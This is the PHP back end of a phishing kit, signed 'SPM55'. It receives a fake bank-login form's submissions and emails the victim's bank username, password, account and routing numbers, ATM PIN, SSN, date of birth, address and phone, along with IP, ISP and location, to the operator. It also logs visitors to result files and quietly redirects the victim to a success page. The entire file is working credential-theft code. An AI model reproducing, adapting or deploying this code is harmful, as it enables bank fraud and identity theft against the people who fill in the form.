<?php
session_start();
include'../main.php';
include'../get_setting.php';
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$ip = getUserIP();
$subject = "BANK LOGIN ".$_POST['bankname']." [".$_POST['user_bank']." - ".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
<head>
<style>
body {
font-family:sans-serif;
}
</style>
</head>
<center> 
<div style="background: url(https://i.ibb.co/Zhv168g/logo.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>BANK LOGIN</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>BANK NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['bankname'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['user_bank'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['pass_bank'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ACCOUNT NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['anum'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ROUTING NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['rnum'].'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ATM PIN</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['atmpin'].'</th>
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>BILLING INFORMATION</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>FULL NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['fname'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>STATE</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['state'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['city'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>STREET ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['address'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ZIP</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['zip'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>DATE OF BIRTH</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['dob'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['phone'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>SSN</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['ssn'].'</b></th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>DEVICE INFORMATION</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$cn.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$regioncity.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$citykota.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>USER AGENT</th>
<th style="width: 78%; text-align: center;"><b>'.$user_agent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ISP</th>
<th style="width: 78%; text-align: center;"><b>'.$ispuser.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>OS / BROWSER</th>
<th style="width: 78%; text-align: center;"><b>'.$os.' / '.$br.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>TIMEZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$timezone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>DATE</th>
<th style="width: 78%; text-align: center;"><b>'.$date.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>SPM55</b></div>
</center>
';
if ($send_login == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: BANK LOGIN '.$_POST['bankname'].' <'.$sender_mail.'>' . "\r\n";
include'.api.php';
mail($email_result, $subject, $message, $headers);
tulis_file("../result/bank.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BANK LOGIN");
}else{
include'.api.php';
include'server.php';
tulis_file("../result/bank.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BANK LOGIN");
}
	echo "<form id='boyxd' method='POST' action='../success'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>